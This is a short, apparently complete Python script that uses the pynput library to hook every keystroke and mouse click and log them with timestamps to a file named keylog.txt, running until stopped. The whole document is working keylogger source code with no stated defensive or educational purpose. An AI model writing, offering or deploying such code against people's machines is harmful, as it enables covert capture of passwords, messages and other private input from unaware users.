import logging
import re
from pynput import keyboard, mouse

# Set up logging configuration
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s %(message)s')

# Function to log keystrokes
def log_keystroke(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(str(key))

# Function to log mouse clicks
def log_mouse_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse click at ({}, {})'.format(x, y))

# Hook the keyboard event
keyboard_listener = keyboard.Listener(on_press=log_keystroke)
keyboard_listener.start()

# Hook the mouse click event
mouse_listener = mouse.Listener(on_click=log_mouse_click)
mouse_listener.start()

# Keep the script running
keyboard_listener.join()
mouse_listener.join()
